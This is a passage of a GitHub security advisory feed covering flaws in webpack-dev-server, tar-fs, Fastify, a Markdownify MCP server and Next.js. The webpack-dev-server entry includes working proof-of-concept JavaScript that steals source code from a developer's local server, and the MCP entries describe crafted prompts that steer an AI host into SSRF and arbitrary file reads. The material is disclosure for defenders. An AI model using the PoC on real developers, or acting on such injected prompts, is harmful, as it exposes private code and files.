<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30360">https://nvd.nist.gov/vuln/detail/CVE-2025-30360</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239">https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a></li>
<li><a href="https://github.com/advisories/GHSA-9jgg-88mc-972h">https://github.com/advisories/GHSA-9jgg-88mc-972h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jgg-88mc-972h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:09:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack-dev-server] webpack-dev-server users' source code may be stolen when they access a malicious web site]]></title>
        <id>https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</id>
        <link href="https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"/>
        <updated>2025-06-04T21:09:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Source code may be stolen when you access a malicious web site.</p>
<h3 id="details">Details</h3>
<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:8080/main.js"&gt;</code> in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.
By using <code>Function::toString</code> against the values in <code>__webpack_modules__</code>, the attacker can get the source code.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18426585/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/</code></li>
<li>You can see the source code output in the document and the devtools console.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">let moduleList
const onHandlerSet = (handler) =&gt; {
  console.log('h', handler)
  moduleList = handler.require.m
}

const originalArrayForEach = Array.prototype.forEach
Array.prototype.forEach = function forEach(callback, thisArg) {
  callback((handler) =&gt; {
    onHandlerSet(handler)
  })
  originalArrayForEach.call(this, callback, thisArg)
  Array.prototype.forEach = originalArrayForEach
}

const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
  console.log(moduleList)
  for (const key in moduleList) {
    const p = document.createElement('p')
    const title = document.createElement('strong')
    title.textContent = key
    const code = document.createElement('code')
    code.textContent = moduleList[key].toString()
    p.append(title, ':', document.createElement('br'), code)
    document.body.appendChild(p)
  }
})
document.head.appendChild(script)
</code></pre>
<p>This script uses the function generated by <a href="https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383"><code>renderRequire</code></a>.</p>
<pre><code class="language-js">    // The require function
    function __webpack_require__(moduleId) {
        // Check if module is in cache
        var cachedModule = __webpack_module_cache__[moduleId];
        if (cachedModule !== undefined) {
            return cachedModule.exports;
        }
        // Create a new module (and put it into the cache)
        var module = __webpack_module_cache__[moduleId] = {
            // no module.id needed
            // no module.loaded needed
            exports: {}
        };
        // Execute the module function
        var execOptions = {
            id: moduleId,
            module: module,
            factory: __webpack_modules__[moduleId],
            require: __webpack_require__
        };
        __webpack_require__.i.forEach(function(handler) {
            handler(execOptions);
        });
        module = execOptions.module;
        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);
        // Return the exports of the module
        return module.exports;
    }
</code></pre>
<p>Especially, it uses the fact that <code>Array::forEach</code> is called for <code>__webpack_require__.i</code> and <code>execOptions</code> contains <code>__webpack_require__</code>.
It uses prototype pollution against <code>Array::forEach</code> to extract <code>__webpack_require__</code> reference.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.</p>
<details>
<summary>Old content</summary>

<h3 id="summary-1">Summary</h3>
<p>Source code may be stolen when you use <a href="https://webpack.js.org/configuration/output/#outputiife"><code>output.iife: false</code></a> and access a malicious web site.</p>
<h3 id="details-1">Details</h3>
<p>When <code>output.iife: false</code> is set, some global variables for the webpack runtime are declared on the <code>window</code> object (e.g. <code>__webpack_modules__</code>).
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:8080/main.js"&gt;</code> in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the <code>window</code> object.
By using <code>Function::toString</code> against the values in <code>__webpack_modules__</code>, the attacker can get the source code.</p>
<p>I pointed out <code>output.iife: false</code>, but if there are other options that makes the webpack runtime variables to be declared on the <code>window</code> object, the same will apply for those cases.</p>
<h3 id="poc-1">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18409777/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/</code></li>
<li>Open the devtools console.</li>
<li>You can see the content of <code>src/index.js</code> and other scripts loaded.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
    for (const module in window.__webpack_modules__) {
        console.log(`${module}:`, window.__webpack_modules__[module].toString())
    }
})
document.head.appendChild(script)
</code></pre>
<h3 id="impact-1">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that has <code>output.iife: false</code> option set and uses a predictable port and output path for the entrypoint script.</p>
</details>
### References

<ul>
<li><a href="https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v">https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30359">https://nvd.nist.gov/vuln/detail/CVE-2025-30359</a></li>
<li><a href="https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e">https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e</a></li>
<li><a href="https://github.com/advisories/GHSA-4v9v-hfq4-rm2v">https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v9v-hfq4-rm2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:09:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs can extract outside the specified dir with a specific tarball]]></title>
        <id>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</id>
        <link href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"/>
        <updated>2025-06-03T06:14:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p> v3.0.8, v2.1.2, v1.16.4 and below</p>
<h3 id="patches">Patches</h3>
<p>Has been patched in 3.0.9, 2.1.3, and 1.16.5</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the ignore option to ignore non files/directories.</p>
<pre><code class="language-js">  ignore (_, header) {
    // pass files &amp; directories, ignore e.g. symlinks
    return header.type !== 'file' &amp;&amp; header.type !== 'directory'
  }
</code></pre>
<h3 id="credit">Credit</h3>
<p>Thank you Caleb Brown from Google Open Source Security Team for reporting this in detail.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48387">https://nvd.nist.gov/vuln/detail/CVE-2025-48387</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f">https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f</a></li>
<li><a href="https://github.com/advisories/GHSA-8cj5-5rvv-wf4v">https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cj5-5rvv-wf4v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-03T06:14:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastify] Fastify vulnerable to invalid content-type parsing, which could lead to validation bypass]]></title>
        <id>https://github.com/advisories/GHSA-mg2h-6x62-wpwc</id>
        <link href="https://github.com/advisories/GHSA-mg2h-6x62-wpwc"/>
        <updated>2025-05-29T21:04:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In applications that specify different validation strategies for different content types, it's possible to bypass the validation by providing a <em>slightly altered</em> content type such as with different casing or altered whitespacing before <code>;</code>.</p>
<p>Users using the the following pattern are affected:</p>
<pre><code class="language-js">fastify.post('/', {
  handler(request, reply) {
    reply.code(200).send(request.body)
  },
  schema: {
    body: {
      content: {
        'application/json': {
          schema: {
            type: 'object',
            properties: {
              'foo': {
                type: 'string',
              }
            },
            required: ['foo']
          }
        },
      }
    }
  }
})
</code></pre>
<p>User using the following pattern are <strong>not</strong> affected:</p>
<pre><code class="language-js">fastify.post('/', {
  handler(request, reply) {
    reply.code(200).send(request.body)
  },
  schema: {
    body: {
      type: 'object',
      properties: {
        'foo': {
          type: 'string',
        }
      },
      required: ['foo']
    }
  }
})
</code></pre>
<h3 id="patches">Patches</h3>
<p>This was patched in v5.3.1, but unfortunately it did not cover all problems. This has been fully patched in v5.3.2.
Version v4.9.0 was also affected by this issue. This has been fully patched in v4.9.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not specify multiple content types in the schema.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p><a href="https://hackerone.com/reports/3087928">https://hackerone.com/reports/3087928</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc">https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc</a></li>
<li><a href="https://github.com/fastify/fastify/commit/436da4c06dfbbb8c24adee3a64de0c51e4f47418">https://github.com/fastify/fastify/commit/436da4c06dfbbb8c24adee3a64de0c51e4f47418</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32442">https://nvd.nist.gov/vuln/detail/CVE-2025-32442</a></li>
<li><a href="https://hackerone.com/reports/3087928">https://hackerone.com/reports/3087928</a></li>
<li><a href="https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4">https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4</a></li>
<li><a href="https://github.com/advisories/GHSA-mg2h-6x62-wpwc">https://github.com/advisories/GHSA-mg2h-6x62-wpwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg2h-6x62-wpwc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-18T15:02:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-markdownify-server] Markdownify MCP Server allows Server-Side Request Forgery (SSRF) via the Markdownify.get() function]]></title>
        <id>https://github.com/advisories/GHSA-frq9-3hp2-xvxg</id>
        <link href="https://github.com/advisories/GHSA-frq9-3hp2-xvxg"/>
        <updated>2025-05-29T17:27:26.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package mcp-markdownify-server are vulnerable to Server-Side Request Forgery (SSRF) via the Markdownify.get() function. An attacker can craft a prompt that, once accessed by the MCP host, can invoke the webpage-to-markdown, bing-search-to-markdown, and youtube-to-markdown tools to issue requests and read the responses to attacker-controlled URLs, potentially leaking sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5276">https://nvd.nist.gov/vuln/detail/CVE-2025-5276</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/commit/0284aa8f34d32c65e20d8cda2d429b7943c9af03">https://github.com/zcaceres/markdownify-mcp/commit/0284aa8f34d32c65e20d8cda2d429b7943c9af03</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249387">https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249387</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/blob/224cf89f0d58616d2a5522f60f184e8391d1c9e3/src/server.ts#L20C17-L20C29">https://github.com/zcaceres/markdownify-mcp/blob/224cf89f0d58616d2a5522f60f184e8391d1c9e3/src/server.ts#L20C17-L20C29</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-3hp2-xvxg">https://github.com/advisories/GHSA-frq9-3hp2-xvxg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-3hp2-xvxg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-29T06:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-markdownify-server] Markdownify MCP Server allows attackers to read arbitrary files]]></title>
        <id>https://github.com/advisories/GHSA-22v8-p7h2-rj7p</id>
        <link href="https://github.com/advisories/GHSA-22v8-p7h2-rj7p"/>
        <updated>2025-05-29T17:27:11.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package mcp-markdownify-server are vulnerable to Files or Directories Accessible to External Parties via the get-markdown-file tool. An attacker can craft a prompt that, once accessed by the MCP host, will allow it to read arbitrary files from the host running the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5273">https://nvd.nist.gov/vuln/detail/CVE-2025-5273</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/commit/3a6b202d088ef7acb8be84bc09515f41a2b1a9df">https://github.com/zcaceres/markdownify-mcp/commit/3a6b202d088ef7acb8be84bc09515f41a2b1a9df</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249193">https://security.snyk.io/vuln/SNYK-JS-MCPMARKDOWNIFYSERVER-10249193</a></li>
<li><a href="https://github.com/zcaceres/markdownify-mcp/blob/3667bd4765c0e49684ce22df268d02dd478a7f3b/src/Markdownify.ts#L94">https://github.com/zcaceres/markdownify-mcp/blob/3667bd4765c0e49684ce22df268d02dd478a7f3b/src/Markdownify.ts#L94</a></li>
<li><a href="https://github.com/advisories/GHSA-22v8-p7h2-rj7p">https://github.com/advisories/GHSA-22v8-p7h2-rj7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22v8-p7h2-rj7p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-29T06:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Information exposure in Next.js dev server due to lack of origin verification]]></title>
        <id>https://github.com/advisories/GHSA-3h52-269p-cp9r</id>
        <link href="https://github.com/advisories/GHSA-3h52-269p-cp9r"/>
        <updated>2025-05-30T15:17:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A low-severity vulnerability in <strong>Next.js</strong> has been fixed in <strong>version 15.2.2</strong>. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while <code>npm run dev</code> is active.</p>
<p>Learn more: <a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></p>
<h2 id="credit">Credit</h2>
<p>Thanks to <a href="https://github.com/sapphi-red">sapphi-red</a> and <a href="https://github.com/R4356th">Radman Siddiki</a> for responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r">https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48068">https://nvd.nist.gov/vuln/detail/CVE-2025-48068</a></li>
<li><a href="https://github.com/advisories/GHSA-3h52-269p-cp9r">https://github.com/advisories/GHSA-3h52-269p-cp9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h52-269p-cp9r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T21:52:13.000Z</published>
    </entry>
</feed>